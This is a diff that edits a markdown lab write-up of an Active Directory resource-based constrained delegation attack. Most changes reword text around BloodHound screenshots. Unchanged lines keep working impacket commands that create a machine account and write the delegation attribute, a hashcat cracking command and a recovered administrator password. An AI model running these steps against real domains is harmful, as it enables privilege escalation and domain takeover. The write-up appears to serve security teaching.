@@ -103,20 +103,26 @@ bloodhound-python -u zouhair -p 'Password123' -d corp.local -ns 192.168.1.10 -c 
 ```
 
 ![BloodHound — full AD enumeration graph](/writeups/rbcd/ad-enumeration-bloodhound.png)
+After lunching Bloodhound we upload the ZIP file we obtained earlier as shown below.
+![BloodHound GUI — Uploading the ZIP file](/writeups/rbcd/ad-bloodhound-gui.png)
 
 ### Critical Finding — GenericWrite on WS01
 
-![BloodHound GUI — Uploading the ZIP file](/writeups/rbcd/ad-bloodhound-gui.png)
 
+We can search for any object to get information. Here is information about the domain user ZOUHAIR@CORP.LOCAL
 ![WS01 object information](/writeups/rbcd/ad-bloodhound-object-info.png)
 
-![Outbound control — zouhair has GenericWrite over WS01](/writeups/rbcd/ad-bloodhound-outbound-control-genericwrite.png)
+![zouhair's group membership — member of IT group](/writeups/rbcd/ad-bloodhound-user-membership.png)
+we notice that the user ZOUHAIR@CORP.LOCAL is a member of the Domain Users group and the IT group.
 
+![Outbound control — zouhair has GenericWrite over WS01](/writeups/rbcd/ad-bloodhound-outbound-control-genericwrite.png)
+After analyzing the Outbound Control, We can see that the user has `GenericWrite` over `WS01WS01.CORP.LOCAL`, inherited through IT group membership. This allows writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which leads to an RBCD attack.
+
+
+We can see also the Inbound control over the user.
 ![Inbound control rights on WS01](/writeups/rbcd/ad-bloodhound-inbound.png)
 
-![zouhair's group membership — member of IT group](/writeups/rbcd/ad-bloodhound-user-membership.png)
 
-After uploading the ZIP file, it is time to analyze what we can do with the user and to define a path to compromise the entire domain. From the screenshots, we notice that the user ZOUHAIR@CORP.LOCAL is a member of the Domain Users group and the IT group. The user has `GenericWrite` over `WS01.CORP.LOCAL`, inherited through IT group membership. This allows writing to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which leads to an RBCD attack.
 
 ---
 
@@ -126,6 +132,8 @@ Resource-Based Constrained Delegation (RBCD) allows a computer object to specify
 
 ### Create a Controlled Machine Account
 
+We start by creating a machine account `ZXGR$` in the domain. It will act as a controlled entity that we use to perform the RBCD attack.
+
 ```bash
 impacket-addcomputer corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -computer-name 'ZXGR$' -computer-pass 'Active@123!'
 ```
@@ -133,6 +141,8 @@ impacket-addcomputer corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -compu
 ![ZXGR$ machine account created successfully](/writeups/rbcd/ad-addingcomputer-impacket.png)
 
 ### Write RBCD Delegation Attribute
+
+After creating the machine account, we now configure the delegation by writing to the target object:
 
 ```bash
 impacket-rbcd corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -action write -delegate-to 'WS01$' -delegate-from 'ZXGR$'
@@ -143,7 +153,7 @@ impacket-rbcd corp.local/zouhair:'Password123' -dc-ip 192.168.1.10 -action write
 ![RBCD read — ZXGR$ confirmed in delegation list](/writeups/rbcd/ad-delegate-verification.png)
 
 > [!NOTE]
-> **WHAT HAPPENED** — WS01's `msDS-AllowedToActOnBehalfOfOtherIdentity` now includes `ZXGR$`. This instructs the KDC: *"trust ZXGR$ to impersonate any user to this machine"*.
+> WS01's `msDS-AllowedToActOnBehalfOfOtherIdentity` now includes `ZXGR$`. This instructs the KDC: *"trust ZXGR$ to impersonate any user to this machine"*.
 
 ---
 
@@ -186,7 +196,7 @@ hashcat -m 2100 -a 0 admin_hash /usr/share/seclists/Passwords/corporate_password
 ![Hash cracked — Administrator password recovered](/writeups/rbcd/ad-cracked-hash.png)
 
 > [!TIP]
-> **ADMINISTRATOR PASSWORD** — `P@ssw0rd123!` recovered via offline dictionary attack.
+> **ADMINISTRATOR PASSWORD**  `P@ssw0rd123!` 
 
 ---
 
